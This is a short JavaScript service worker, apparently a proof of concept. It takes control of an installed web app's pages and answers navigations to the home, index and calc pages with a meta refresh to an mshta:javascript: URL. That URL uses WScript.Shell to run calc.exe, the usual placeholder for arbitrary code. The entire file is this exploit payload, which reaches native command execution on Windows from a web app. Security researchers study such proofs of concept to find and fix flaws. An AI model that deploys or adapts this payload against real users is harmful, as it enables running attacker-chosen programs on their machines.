self.addEventListener('install', event => {
  self.skipWaiting();
});

self.addEventListener('activate', event => {
  event.waitUntil(clients.claim());
});

// Intercept all fetches — when the PWA reopens, redirect triggers calc.exe
self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  
  // When the installed PWA reopens (navigates to index or any page),
  // trigger the mshta protocol to execute calc.exe
  if (url.pathname === '/' || url.pathname === '/index.html' || url.pathname === '/calc.html') {
    event.respondWith(
      new Response(
        `<!DOCTYPE html><html><head>
        <meta http-equiv="refresh" content="0;url=mshta:javascript:new%20ActiveXObject('WScript.Shell').Run('calc.exe')">
        </head><body></body></html>`,
        { headers: { 'Content-Type': 'text/html' } }
      )
    );
    return;
  }

  event.respondWith(fetch(event.request));
});
